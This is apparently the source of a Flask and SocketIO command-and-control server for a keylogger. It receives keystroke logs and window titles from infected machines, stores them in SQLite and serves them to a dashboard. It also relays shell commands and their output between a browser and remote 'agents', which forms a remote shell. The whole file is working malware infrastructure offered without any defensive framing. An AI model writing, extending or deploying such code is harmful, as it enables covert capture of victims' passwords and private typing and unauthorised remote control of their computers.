import sqlite3
import datetime
from flask import Flask, request, render_template, jsonify, redirect
from pathlib import Path
from flask_socketio import SocketIO, emit


app = Flask(__name__) 
app.config["SECRET_KEY"] = "cerberus" # secret key yoav!!
socketio = SocketIO(app) 

BASE_DIR = Path(__file__).resolve().parent
DB_PATH  = BASE_DIR / "database" / "logs.db"


def get_db():
    db = sqlite3.connect(DB_PATH)
    db.row_factory = sqlite3.Row
    return db


def init_db():
    db = get_db()
    db.execute("""
        CREATE TABLE IF NOT EXISTS keystrokes (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            machine   TEXT,
            timestamp TEXT,
            window    TEXT,
            data      TEXT
        )
    """)
    # migrate existing databases that predate the window column
    try:
        db.execute("ALTER TABLE keystrokes ADD COLUMN window TEXT")
    except Exception:
        pass  # column already exists
    db.commit()
    db.close()


# Routes

@app.route("/log", methods=["POST"])
def receive_log():
    """Keylogger posts structured JSON: {machine, sessions: [{window, timestamp, keys}]}"""
    payload  = request.get_json(silent=True) or {}
    machine  = payload.get("machine", "unknown")
    incoming = payload.get("sessions", [])

    if not incoming:
        return "OK", 200

    db = get_db()
    for s in incoming:
        ts = s.get("timestamp") or datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        db.execute(
            "INSERT INTO keystrokes (machine, timestamp, window, data) VALUES (?, ?, ?, ?)",
            (machine, ts, s.get("window", ""), s.get("keys", ""))
        )
    db.commit()
    db.close()
    return "OK", 200


@app.route("/api/logs")
def api_logs():
    """Returns all keystroke rows as JSON for the dashboard's JS polling."""
    db   = get_db()
    rows = db.execute("SELECT * FROM keystrokes ORDER BY id DESC").fetchall()
    db.close()
    return jsonify([dict(row) for row in rows])


@app.route("/")
def dashboard():
    return render_template("index.html")


@app.route("/shell")
def shell():
    """Legacy URL — redirect to the combined dashboard."""
    return redirect("/")


# WebSocket events

@socketio.on("connect")
def on_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on("disconnect")
def on_disconnect():
    print(f"[-] Client disconnected: {request.sid}")

@socketio.on("shell_output")
def on_shell_output(data):
    """Agent sends command output → forward to browser."""
    emit("shell_output", data, broadcast=True)

@socketio.on("shell_command")
def on_shell_command(data):
    """Browser sends command → forward to agent."""
    emit("shell_command", data, broadcast=True)


if __name__ == "__main__":
    init_db()
    socketio.run(app, debug=True, host="0.0.0.0", port=5000)
